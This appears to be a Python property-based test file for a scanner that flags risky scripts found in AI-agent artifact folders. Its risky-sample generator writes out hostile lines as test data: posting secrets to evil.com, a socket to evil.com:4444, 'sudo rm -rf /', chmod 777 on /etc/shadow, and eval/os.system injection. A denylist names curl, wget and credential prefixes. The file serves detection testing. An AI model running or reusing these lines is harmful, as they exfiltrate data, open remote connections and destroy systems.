"""Property-based tests for pipeline integration (script scanning).

# Feature: script-file-scanning, Properties 7, 8, 9, 12

**Validates: Requirements 5.5, 6.6, 6.9, 10.2**

Property 7: For any set of files in a directory, if a Script_File can only be
classified through sibling signals (i.e., its only potential classifying sibling
is itself only classifiable via sibling signals), the ArtifactClassifier SHALL NOT
classify that Script_File. Only files classified through non-sibling signals
(extension, path, content, semantic) SHALL act as sibling sources.

Property 8: For any ScanFinding produced by the CodeAudit scanner on a script file,
the confidence score SHALL be in the range [0.40, 1.0]. No finding with confidence
below 0.40 SHALL appear in the reported results.

Property 9: For any script file content that contains none of the defined risk
patterns (secrets, injection, privilege escalation, network exfiltration), the
CodeAudit scanner SHALL return an empty findings list.

Property 12: For any set of input files, when script_scanning_enabled=False, the
pipeline SHALL produce zero script-classification log entries, zero script-related
findings, and zero Reference_Resolver activity.
"""

from __future__ import annotations

import tempfile
from pathlib import Path

from hypothesis import assume, given, settings
from hypothesis import strategies as st

from ai_artifact_risk_validator.classifiers.classifier import (
    ArtifactClassifier,
)
from ai_artifact_risk_validator.classifiers.script_context import ScriptClassificationContext
from ai_artifact_risk_validator.classifiers.script_patterns import DEFAULT_SCRIPT_EXTENSIONS
from ai_artifact_risk_validator.models.config import ValidatorConfig
from ai_artifact_risk_validator.models.enums import ArtifactType
from ai_artifact_risk_validator.scanners.code_audit import CodeAuditScanner

# --- Constants ---

_SCRIPT_EXTENSIONS = DEFAULT_SCRIPT_EXTENSIONS

_SAFE_BASENAMES = [
    "main",
    "helper",
    "utils",
    "server",
    "handler",
    "worker",
    "run",
    "setup",
    "init",
    "deploy",
]

# Artifact types that can be scanned by CodeAudit
_SCANNABLE_ARTIFACT_TYPES = [
    ArtifactType.SKILL,
    ArtifactType.HOOK,
    ArtifactType.MCP,
    ArtifactType.PLUGIN,
    ArtifactType.AGENT,
]


# --- Strategies ---


@st.composite
def clean_script_content(draw: st.DrawFn) -> str:
    """Generate script content guaranteed free of risk patterns.

    Produces benign Python code: variable assignments, arithmetic,
    print statements, list operations, and string formatting without
    any dangerous function calls, network requests, secrets, or
    privilege escalation patterns.
    """
    lines: list[str] = []

    # Add some harmless imports
    safe_imports = [
        "import math",
        "import os.path",
        "import json",
        "import collections",
        "import itertools",
        "import functools",
        "import dataclasses",
        "import typing",
        "import pathlib",
        "import enum",
    ]
    num_imports = draw(st.integers(min_value=0, max_value=3))
    chosen_imports = draw(
        st.lists(st.sampled_from(safe_imports), min_size=num_imports, max_size=num_imports)
    )
    lines.extend(chosen_imports)

    # Add some harmless variable assignments with arithmetic
    num_vars = draw(st.integers(min_value=1, max_value=5))
    for i in range(num_vars):
        var_name = draw(st.sampled_from(["x", "y", "z", "total", "count", "value", "result"]))
        value = draw(st.integers(min_value=0, max_value=1000))
        op = draw(st.sampled_from(["+", "-", "*", "//"]))
        rhs = draw(st.integers(min_value=1, max_value=100))
        lines.append(f"{var_name}_{i} = {value} {op} {rhs}")

    # Add some harmless function definitions
    num_funcs = draw(st.integers(min_value=0, max_value=2))
    for i in range(num_funcs):
        fname = draw(st.sampled_from(["add", "multiply", "compute", "transform", "calculate"]))
        lines.append(f"def {fname}_{i}(a, b):")
        lines.append(f"    return a + b + {i}")
        lines.append("")

    # Add some print statements (benign)
    num_prints = draw(st.integers(min_value=0, max_value=3))
    for _ in range(num_prints):
        msg = draw(st.sampled_from(["hello", "done", "starting", "complete", "processing"]))
        lines.append(f'print("{msg}")')

    # Add some list/dict operations
    num_ops = draw(st.integers(min_value=0, max_value=3))
    for i in range(num_ops):
        lines.append(f"items_{i} = [1, 2, 3, 4, 5]")
        lines.append(f"total_{i} = sum(items_{i})")

    content = "\n".join(lines)

    # Final safety check: ensure no dangerous patterns accidentally appear
    dangerous_tokens = [
        "eval(",
        "exec(",
        "compile(",
        "subprocess",
        "os.system",
        "shell=True",
        "setuid",
        "setgid",
        "chmod",
        "sudo ",
        "curl ",
        "wget ",
        "requests.get",
        "requests.post",
        "urllib",
        "http://",
        "https://",
        "socket.connect",
        "pickle.load",
        "yaml.load",
        "marshal.load",
        "AKIA",
        "sk-",
        "ghp_",
        "password",
        "secret",
        "token",
        "api_key",
        "private_key",
        "BEGIN RSA",
        "Invoke-Expression",
        "Invoke-WebRequest",
        "child_process",
        "Runtime.exec",
        "ProcessBuilder",
        "__import__",
        "importlib",
    ]
    for token in dangerous_tokens:
        assume(token.lower() not in content.lower())

    return content


@st.composite
def risky_script_content(draw: st.DrawFn, pattern_type: str = "injection") -> str:
    """Generate script content containing a specific risk pattern.

    Args:
        pattern_type: One of "injection", "secrets", "privilege", "exfiltration".

    Returns:
        Python script content containing the specified risk pattern.
    """
    lines: list[str] = ["# Script with risk pattern"]

    if pattern_type == "injection":
        pattern = draw(
            st.sampled_from(
                [
                    "eval(user_input)",
                    "exec(command_str)",
                    "import subprocess\nsubprocess.call(cmd, shell=True)",
                    "import os\nos.system(user_cmd)",
                    'compile(code_str, "<string>", "exec")',
                ]
            )
        )
        lines.append(pattern)
    elif pattern_type == "secrets":
        pattern = draw(
            st.sampled_from(
                [
                    'api_key = "AKIA1234567890EXAMPLE"',
                    'token = "ghp_abcdefghijklmnopqrstuvwxyz123456"',
                    'password = "super_secret_password_123"',
                    'secret_key = "sk-abcdefghijklmnopqrstuvwxyz"',
                ]
            )
        )
        lines.append(pattern)
    elif pattern_type == "privilege":
        pattern = draw(
            st.sampled_from(
                [
                    "import os\nos.setuid(0)",
                    'import subprocess\nsubprocess.call(["sudo", "rm", "-rf", "/"])',
                    'import os\nos.chmod("/etc/shadow", 0o777)',
                ]
            )
        )
        lines.append(pattern)
    elif pattern_type == "exfiltration":
        pattern = draw(
            st.sampled_from(
                [
                    'import requests\nrequests.post("http://evil.com/exfil", data=secrets)',
                    'import urllib.request\nurllib.request.urlopen("http://10.0.0.1/steal")',
                    'import socket\ns = socket.socket()\ns.connect(("evil.com", 4444))',
                ]
            )
        )
        lines.append(pattern)

    return "\n".join(lines)


# --- Property 7: Sibling classification non-transitivity ---


class TestProperty7SiblingNonTransitivity:
    """Property 7: Sibling classification non-transitivity.

    # Feature: script-file-scanning, Property 7: Sibling classification non-transitivity

    If a Script_File can only be classified through sibling signals (i.e.,
    its only potential classifying sibling is itself only classifiable via
    sibling signals), the ArtifactClassifier SHALL NOT classify that Script_File.
    Only files classified through non-sibling signals SHALL act as sibling sources.
    """

    @settings(max_examples=100)
    @given(
        ext1=st.sampled_from(_SCRIPT_EXTENSIONS),
        ext2=st.sampled_from(_SCRIPT_EXTENSIONS),
        basename1=st.sampled_from(_SAFE_BASENAMES),
        basename2=st.sampled_from(_SAFE_BASENAMES),
    )
    def test_scripts_only_with_script_siblings_not_classified(
        self, ext1: str, ext2: str, basename1: str, basename2: str
    ) -> None:
        """Scripts whose only siblings are other scripts should NOT be classified.

        **Validates: Requirements 5.5**

        When a directory contains only script files and no non-script files
        classified through non-sibling signals, the sibling classification
        should not activate for any of them (non-transitivity).
        """
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            # Create two script files in a neutral directory (no AI signals)
            script1 = tmp_path / "neutral_dir" / f"{basename1}{ext1}"
            script2 = tmp_path / "neutral_dir" / f"{basename2}{ext2}"
            script1.parent.mkdir(parents=True, exist_ok=True)
            script1.write_text("x = 1")
            script2.write_text("y = 2")

            classifier = ArtifactClassifier()

            # Context with empty directory_artifacts (no non-script siblings)
            context = ScriptClassificationContext(
                directory_artifacts={},
                referenced_scripts={},
                mcp_project_dirs=set(),
            )

            result1 = classifier.classify_script(script1, context)
            result2 = classifier.classify_script(script2, context)

            # Neither should be classified since no non-sibling source exists
            assert result1 is None, (
                f"Script {script1.name} should NOT be classified via sibling "
                f"when only other scripts exist in the directory"
            )
            assert result2 is None, (
                f"Script {script2.name} should NOT be classified via sibling "
                f"when only other scripts exist in the directory"
            )

    @settings(max_examples=100)
    @given(
        ext=st.sampled_from(_SCRIPT_EXTENSIONS),
        basename=st.sampled_from(_SAFE_BASENAMES),
        artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES),
        confidence=st.floats(min_value=0.31, max_value=1.0),
    )
    def test_scripts_with_non_script_sibling_are_classified(
        self, ext: str, basename: str, artifact_type: ArtifactType, confidence: float
    ) -> None:
        """Scripts with a classified non-script sibling SHOULD be classified.

        **Validates: Requirements 5.5**

        When a non-script file in the same directory was classified through
        non-sibling signals (it appears in directory_artifacts), script files
        in that directory should inherit the classification via sibling signal.
        """
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            # Create a script file in a neutral directory
            script_file = tmp_path / "project" / f"{basename}{ext}"
            script_file.parent.mkdir(parents=True, exist_ok=True)
            script_file.write_text("x = 1")

            classifier = ArtifactClassifier()

            # Context with a non-script sibling classified via non-sibling signals
            resolved_dir = script_file.resolve().parent
            context = ScriptClassificationContext(
                directory_artifacts={resolved_dir: [(artifact_type, confidence)]},
                referenced_scripts={},
                mcp_project_dirs=set(),
            )

            result = classifier.classify_script(script_file, context)

            # Should be classified with the sibling's artifact type
            assert result is not None, (
                f"Script {script_file.name} should be classified via sibling "
                f"when a non-script sibling has been classified"
            )
            assert result.artifact_type == artifact_type
            assert "directory_context" in result.signals

    @settings(max_examples=100)
    @given(
        num_scripts=st.integers(min_value=2, max_value=5),
        ext=st.sampled_from(_SCRIPT_EXTENSIONS),
    )
    def test_transitive_sibling_chain_not_classified(self, num_scripts: int, ext: str) -> None:
        """A chain of script files should not produce transitive classification.

        **Validates: Requirements 5.5**

        Even if one script could hypothetically classify another through sibling
        signals, the chain should not propagate because script files cannot act
        as sibling sources (only files classified via non-sibling signals can).
        """
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            dir_path = tmp_path / "chain_dir"
            dir_path.mkdir(parents=True)

            # Create multiple script files
            scripts = []
            for i in range(num_scripts):
                script = dir_path / f"script_{i}{ext}"
                script.write_text(f"val = {i}")
                scripts.append(script)

            classifier = ArtifactClassifier()

            # Empty context — no non-script files classified
            context = ScriptClassificationContext(
                directory_artifacts={},
                referenced_scripts={},
                mcp_project_dirs=set(),
            )

            # None of the scripts should be classified
            for script in scripts:
                result = classifier.classify_script(script, context)
                assert result is None, (
                    f"Script {script.name} should NOT be classified in a "
                    f"directory with only script files (non-transitivity)"
                )


# --- Property 8: CodeAudit confidence bounds ---


class TestProperty8CodeAuditConfidenceBounds:
    """Property 8: CodeAudit confidence bounds.

    # Feature: script-file-scanning, Property 8: CodeAudit confidence bounds

    All ScanFinding produced by CodeAudit scanner on script files must have
    confidence in [0.40, 1.0]. No findings below 0.40 should appear.
    """

    @settings(max_examples=100)
    @given(
        data=st.data(),
        artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES),
    )
    def test_injection_findings_confidence_bounds(
        self, data: st.DataObject, artifact_type: ArtifactType
    ) -> None:
        """CodeAudit findings for injection patterns have confidence >= 0.40.

        **Validates: Requirements 6.9**
        """
        content = data.draw(risky_script_content(pattern_type="injection"))
        scanner = CodeAuditScanner()
        findings = scanner.scan(content, artifact_type, "/tmp/script.py")

        for finding in findings:
            assert finding.confidence >= 0.40, (
                f"Finding {finding.id} has confidence {finding.confidence} < 0.40"
            )
            assert finding.confidence <= 1.0, (
                f"Finding {finding.id} has confidence {finding.confidence} > 1.0"
            )

    @settings(max_examples=100)
    @given(
        data=st.data(),
        artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES),
    )
    def test_privilege_findings_confidence_bounds(
        self, data: st.DataObject, artifact_type: ArtifactType
    ) -> None:
        """CodeAudit findings for privilege escalation have confidence >= 0.40.

        **Validates: Requirements 6.9**
        """
        content = data.draw(risky_script_content(pattern_type="privilege"))
        scanner = CodeAuditScanner()
        findings = scanner.scan(content, artifact_type, "/tmp/script.py")

        for finding in findings:
            assert finding.confidence >= 0.40, (
                f"Finding {finding.id} has confidence {finding.confidence} < 0.40"
            )
            assert finding.confidence <= 1.0, (
                f"Finding {finding.id} has confidence {finding.confidence} > 1.0"
            )

    @settings(max_examples=100)
    @given(
        data=st.data(),
        artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES),
    )
    def test_exfiltration_findings_confidence_bounds(
        self, data: st.DataObject, artifact_type: ArtifactType
    ) -> None:
        """CodeAudit findings for exfiltration patterns have confidence >= 0.40.

        **Validates: Requirements 6.9**
        """
        content = data.draw(risky_script_content(pattern_type="exfiltration"))
        scanner = CodeAuditScanner()
        findings = scanner.scan(content, artifact_type, "/tmp/script.py")

        for finding in findings:
            assert finding.confidence >= 0.40, (
                f"Finding {finding.id} has confidence {finding.confidence} < 0.40"
            )
            assert finding.confidence <= 1.0, (
                f"Finding {finding.id} has confidence {finding.confidence} > 1.0"
            )

    @settings(max_examples=100)
    @given(
        data=st.data(),
        artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES),
        ext=st.sampled_from([".py", ".ts", ".js", ".sh", ".ps1", ".rb", ".java", ".rs"]),
    )
    def test_all_findings_within_bounds_any_extension(
        self, data: st.DataObject, artifact_type: ArtifactType, ext: str
    ) -> None:
        """CodeAudit findings for any script extension have confidence in [0.40, 1.0].

        **Validates: Requirements 6.9**
        """
        pattern_type = data.draw(
            st.sampled_from(["injection", "secrets", "privilege", "exfiltration"])
        )
        content = data.draw(risky_script_content(pattern_type=pattern_type))
        scanner = CodeAuditScanner()
        findings = scanner.scan(content, artifact_type, f"/tmp/script{ext}")

        for finding in findings:
            assert finding.confidence >= 0.40, (
                f"Finding {finding.id} on {ext} file has confidence {finding.confidence} < 0.40"
            )
            assert finding.confidence <= 1.0, (
                f"Finding {finding.id} on {ext} file has confidence {finding.confidence} > 1.0"
            )


# --- Property 9: Clean scripts produce empty findings ---


class TestProperty9CleanScriptsEmptyFindings:
    """Property 9: Clean scripts produce empty findings.

    # Feature: script-file-scanning, Property 9: Clean scripts produce empty findings

    Script file content with NO risk patterns should produce zero findings
    from CodeAudit.
    """

    @settings(max_examples=100)
    @given(
        data=st.data(),
        artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES),
    )
    def test_clean_python_scripts_no_findings(
        self, data: st.DataObject, artifact_type: ArtifactType
    ) -> None:
        """Clean Python scripts produce zero CodeAudit findings.

        **Validates: Requirements 6.6**
        """
        content = data.draw(clean_script_content())
        scanner = CodeAuditScanner()
        findings = scanner.scan(content, artifact_type, "/tmp/clean_script.py")

        assert findings == [], (
            f"Clean script produced {len(findings)} findings: "
            f"{[f.id for f in findings]}. Content:\n{content[:200]}"
        )

    @settings(max_examples=100)
    @given(
        data=st.data(),
        artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES),
        ext=st.sampled_from([".ts", ".js", ".sh", ".ps1", ".bat", ".rb"]),
    )
    def test_clean_scripts_other_extensions_no_findings(
        self, data: st.DataObject, artifact_type: ArtifactType, ext: str
    ) -> None:
        """Clean scripts with non-Python extensions produce zero CodeAudit findings.

        **Validates: Requirements 6.6**
        """
        content = data.draw(clean_script_content())
        scanner = CodeAuditScanner()
        findings = scanner.scan(content, artifact_type, f"/tmp/clean_script{ext}")

        assert findings == [], (
            f"Clean {ext} script produced {len(findings)} findings: "
            f"{[f.id for f in findings]}. Content:\n{content[:200]}"
        )

    @settings(max_examples=100)
    @given(artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES))
    def test_empty_script_no_findings(self, artifact_type: ArtifactType) -> None:
        """Empty script content produces zero findings.

        **Validates: Requirements 6.6**
        """
        scanner = CodeAuditScanner()
        findings = scanner.scan("", artifact_type, "/tmp/empty.py")
        assert findings == [], "Empty content should produce zero findings"

    @settings(max_examples=100)
    @given(artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES))
    def test_whitespace_only_script_no_findings(self, artifact_type: ArtifactType) -> None:
        """Whitespace-only script content produces zero findings.

        **Validates: Requirements 6.6**
        """
        scanner = CodeAuditScanner()
        findings = scanner.scan("   \n\n  \t  \n", artifact_type, "/tmp/blank.py")
        assert findings == [], "Whitespace-only content should produce zero findings"


# --- Property 12: Feature toggle disables all script processing ---


class TestProperty12FeatureToggle:
    """Property 12: Feature toggle disables all script processing.

    # Feature: script-file-scanning, Property 12: Feature toggle disables all script processing

    When script_scanning_enabled=False, the pipeline produces zero script
    findings and zero script classification log entries.
    """

    @settings(max_examples=100, deadline=None)
    @given(
        ext=st.sampled_from(_SCRIPT_EXTENSIONS),
        basename=st.sampled_from(_SAFE_BASENAMES),
    )
    def test_disabled_toggle_produces_no_script_pass_findings(
        self, ext: str, basename: str
    ) -> None:
        """With script_scanning_enabled=False, _execute_script_pass produces zero findings.

        **Validates: Requirements 10.2**

        When script scanning is disabled, pass 2 (script-specific classification
        via ReferenceResolver, MCP detection, sibling) is entirely skipped.
        """
        from ai_artifact_risk_validator.validator import Validator

        config = ValidatorConfig(script_scanning_enabled=False)
        validator = Validator(config=config)

        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)

            # Create a script file in a known AI directory (would normally classify in pass 2)
            ai_dir = tmp_path / ".kiro" / "hooks"
            ai_dir.mkdir(parents=True)
            script_file = ai_dir / f"{basename}{ext}"
            script_file.write_text('eval("dangerous")')

            # _execute_script_pass should return empty immediately when disabled
            findings = validator._execute_script_pass(
                script_files=[script_file],
                all_files=[script_file],
                resolved_path=tmp_path,
            )
            assert findings == [], (
                f"_execute_script_pass should return [] when disabled, got {len(findings)} findings"
            )

    @settings(max_examples=100)
    @given(
        ext=st.sampled_from(_SCRIPT_EXTENSIONS),
        basename=st.sampled_from(_SAFE_BASENAMES),
        artifact_type=st.sampled_from(_SCANNABLE_ARTIFACT_TYPES),
    )
    def test_disabled_toggle_skips_partition(
        self, ext: str, basename: str, artifact_type: ArtifactType
    ) -> None:
        """With script_scanning_enabled=False, _partition_files treats all as non-script.

        **Validates: Requirements 10.2**
        """
        from ai_artifact_risk_validator.validator import Validator

        config = ValidatorConfig(script_scanning_enabled=False)
        validator = Validator(config=config)

        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            script_file = tmp_path / f"{basename}{ext}"
            script_file.write_text("x = 1")

            # Partition should return empty script_files when disabled
            script_files, non_script_files = validator._partition_files([script_file])
            assert script_files == [], (
                f"script_files should be empty when scanning disabled, "
                f"got {len(script_files)} files"
            )
            assert non_script_files == [script_file], (
                "All files should be in non_script_files when scanning disabled"
            )

    @settings(max_examples=100)
    @given(
        num_scripts=st.integers(min_value=1, max_value=4),
        ext=st.sampled_from(_SCRIPT_EXTENSIONS),
    )
    def test_disabled_toggle_execute_script_pass_returns_empty(
        self, num_scripts: int, ext: str
    ) -> None:
        """With script_scanning_enabled=False, _execute_script_pass returns [].

        **Validates: Requirements 10.2**
        """
        from ai_artifact_risk_validator.validator import Validator

        config = ValidatorConfig(script_scanning_enabled=False)
        validator = Validator(config=config)

        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)

            # Create script files in known AI directory
            ai_dir = tmp_path / ".kiro" / "skills"
            ai_dir.mkdir(parents=True)
            script_files = []
            for i in range(num_scripts):
                sf = ai_dir / f"script_{i}{ext}"
                sf.write_text(f"val = {i}")
                script_files.append(sf)

            all_files = script_files.copy()
            findings = validator._execute_script_pass(
                script_files=script_files,
                all_files=all_files,
                resolved_path=tmp_path,
            )

            assert findings == [], (
                f"_execute_script_pass should return empty list when disabled, "
                f"got {len(findings)} findings"
            )

    @settings(max_examples=100, deadline=None)
    @given(
        ext=st.sampled_from(_SCRIPT_EXTENSIONS),
        basename=st.sampled_from(_SAFE_BASENAMES),
    )
    def test_disabled_toggle_full_pipeline_no_script_classification(
        self, ext: str, basename: str
    ) -> None:
        """With disabled toggle, partition + script pass produce no script activity.

        **Validates: Requirements 10.2**

        This test verifies the complete chain: when script_scanning_enabled=False,
        files with script extensions are never partitioned as scripts AND the
        script pass never runs for them, guaranteeing zero Reference_Resolver
        activity and zero script-specific classification.
        """
        from ai_artifact_risk_validator.validator import Validator

        config = ValidatorConfig(script_scanning_enabled=False)
        validator = Validator(config=config)

        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)

            # Create multiple scripts in AI-related directories
            # These would ALL be classified in pass 2 if enabled
            ai_dir = tmp_path / ".kiro" / "skills"
            ai_dir.mkdir(parents=True)
            script1 = ai_dir / f"{basename}{ext}"
            script1.write_text('eval("dangerous")')

            mcp_dir = tmp_path / "mcp-servers"
            mcp_dir.mkdir(parents=True)
            script2 = mcp_dir / f"helper{ext}"
            script2.write_text('import os\nos.system("whoami")')

            all_files = [script1, script2]

            # 1. Partition produces empty script_files
            script_files, non_script_files = validator._partition_files(all_files)
            assert script_files == [], "All files should be non-script when scanning disabled"
            assert set(non_script_files) == set(all_files), (
                "All files should appear in non_script_files when disabled"
            )

            # 2. Even if we pass script files directly, execute_script_pass skips
            findings = validator._execute_script_pass(
                script_files=all_files,
                all_files=all_files,
                resolved_path=tmp_path,
            )
            assert findings == [], "_execute_script_pass must return [] when disabled"
